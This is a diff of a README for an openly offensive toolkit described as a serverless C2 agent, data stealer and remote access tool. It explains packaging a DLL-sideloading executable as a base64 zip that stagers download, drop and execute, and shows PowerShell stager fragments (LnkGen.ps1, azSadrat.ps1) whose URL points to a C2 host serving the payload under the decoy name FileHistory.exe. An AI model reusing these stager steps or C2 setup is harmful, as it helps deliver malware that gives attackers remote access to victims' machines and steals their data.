@@ -3,7 +3,7 @@
 ### Serverless C2 Agent, Datastealer and Remote Access Toolkit
 
 #### Stagers
-Zip up the .exe.config, dll and sideloading exe and base64.exe -n 0 -i then upload it into the module repo. Provide the url, stagers will decode and drop, extract, execute.
+Zip up the .exe.config, dll and sideloading exe and base64.exe -n 0 -i then upload it into the module repo. Provide the url, stagers will decode and drop, extract, execute. 
 
 ##### LnkGen.ps1 - Generate a LNK Stager
 ```powershell
@@ -36,7 +36,7 @@ $exeName = "FileHistory.exe"
 
 ##### azSadrat.ps1 - Run a Stager on Azure VM or over PS-Session 
 ```powershell
-$url = "https://c2.server.com/api/assets/fhZip"
+$url =  "https://c2.serverless.com/api/assets/fhZip"
 $zipName = "fh.zip"
 $exeName = "FileHistory.exe"
 $vmname = ""
